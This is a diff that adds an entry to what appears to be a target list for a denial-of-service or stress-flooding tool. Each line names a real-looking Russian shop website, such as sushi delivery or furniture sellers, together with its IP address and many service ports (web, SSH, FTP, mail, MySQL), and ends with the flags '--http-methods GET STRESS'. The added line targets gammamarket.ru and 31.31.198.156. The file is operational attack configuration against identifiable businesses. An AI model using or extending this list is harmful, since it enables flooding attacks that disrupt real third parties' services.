@@ -26,6 +26,8 @@ tcp://185.165.123.40:80 tcp://185.165.123.40:443 tcp://178.248.238.208:80 tcp://
 
 https://anti-sushi.ru https://anti-sushi.ru/catalog/kombo/ https://anti-sushi.ru/catalog/special-offers/ 79.137.239.90:80 79.137.239.90:443 https://79.137.239.90:443 tcp://79.137.239.90:80 tcp://79.137.239.90:443 --http-methods GET STRESS
 
+https://gammamarket.ru http://31.31.198.156:80 http://31.31.198.156:443 https://31.31.198.156:443 http://31.31.198.156:1500 http://31.31.198.156:3306 http://31.31.198.156:8081 http://31.31.198.156:9443 tcp://31.31.198.156:21 tcp://31.31.198.156:22 tcp://31.31.198.156:25 tcp://31.31.198.156:80 tcp://31.31.198.156:443 tcp://31.31.198.156:143 tcp://31.31.198.156:995 tcp://31.31.198.156:1500 tcp://31.31.198.156:8081 tcp://31.31.198.156:587 tcp://31.31.198.156:465 --http-methods GET STRESS
+
 https://mebel-ekb.com https://mebel-ekb.com/kupi-v-kredit/ https://mebel-ekb.com/sale http://213.189.220.188:80 http://213.189.220.188:443 https://213.189.220.188:443 tcp://213.189.220.188:21 tcp://213.189.220.188:22 tcp://213.189.220.188:25 tcp://213.189.220.188:80 tcp://213.189.220.188:443 --http-methods GET STRESS
 
 https://tokyo-hm.ru https://tokyo-hm.ru/index/desserts/ https://tokyo-hm.ru/shipping-and-payment.html 185.78.31.31:80 185.78.31.31:443 https://185.78.31.31:443 tcp://185.78.31.31:21 tcp://185.78.31.31:22 tcp://185.78.31.31:80 tcp://185.78.31.31:443 --http-methods GET STRESS
